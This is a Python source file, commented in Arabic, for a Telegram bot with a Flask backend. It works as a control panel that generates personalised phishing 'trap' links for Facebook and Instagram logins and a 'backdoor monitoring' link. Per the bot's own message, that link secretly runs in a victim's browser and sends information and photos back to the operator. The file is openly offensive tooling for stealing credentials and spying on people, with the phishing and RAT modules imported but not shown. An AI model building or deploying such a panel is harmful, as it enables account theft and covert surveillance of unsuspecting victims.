import os
import threading
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask

# استيراد ملفات الفيس بوك، انستقرام، والتحكم الخلفي المنفصلة تماماً
from facebook_module import init_facebook_routes
from instagram_module import init_instagram_routes
from rat_module import init_rat_routes, rat_bp

BOT_TOKEN = os.getenv("BOT_TOKEN")
RAILWAY_URL = "https://daf-production-8df9.up.railway.app"

if not BOT_TOKEN:
    raise ValueError("[-] BOT_TOKEN is missing!")

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# تسجيل الـ Blueprints الخاصة بالمسارات لتعمل معاً بسلاسة
app.register_blueprint(rat_bp)

# ربط مسارات السيرفر للملفات المستقلة
init_facebook_routes(app, bot)
init_instagram_routes(app, bot)
init_rat_routes(app, bot)

# واجهة البوت الرئيسية وأزراره (محدثة لتشمل الأدوات الثلاث)
def main_menu():
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
    markup.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
    markup.add(InlineKeyboardButton("📱 أداة المراقبة والتحكم الخلفي", callback_data="gen_rat"))
    return markup

@bot.message_handler(commands=['start', 'panel'])
def start_command(message):
    user_name = message.from_user.first_name
    text = (
        f"⚡ **مرحباً بك يا {user_name} في لوحة التحكم المركزية**\n\n"
        "تم عزل كل أداة في ملفها الخاص لضمان الأمان والاستقرار. اختر الأداة المطلوبة:"
    )
    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=main_menu())

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    
    if call.data == "gen_fb":
        bot.answer_callback_query(call.id, "جاري تجهيز رابط فيسبوك...")
        link = f"{RAILWAY_URL}/login.php?id={chat_id}"
        bot.send_message(chat_id, f"🎯 **رابط فيسبوك المخصص:**\n`{link}`", parse_mode="Markdown")
        
    elif call.data == "gen_ig":
        bot.answer_callback_query(call.id, "جاري تجهيز رابط انستقرام...")
        link = f"{RAILWAY_URL}/ig_login.php?id={chat_id}"
        bot.send_message(chat_id, f"📸 **رابط انستقرام المخصص:**\n`{link}`", parse_mode="Markdown")

    elif call.data == "gen_rat":
        bot.answer_callback_query(call.id, "جاري تجهيز رابط المراقبة الخلفية...")
        link = f"{RAILWAY_URL}/system_secure?id={chat_id}"
        bot.send_message(
            chat_id, 
            f"📱 **رابط المراقبة والتحكم الخلفي جاهز:**\n`{link}`\n\nبمجرد أن يفتح الضحية الرابط، ستعمل الجلسة في خلفية متصفحه وتزودك بالمعلومات والصور مباشرة هنا.", 
            parse_mode="Markdown"
        )

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    t = threading.Thread(target=run_flask)
    t.daemon = True
    t.start()
    bot.infinity_polling()
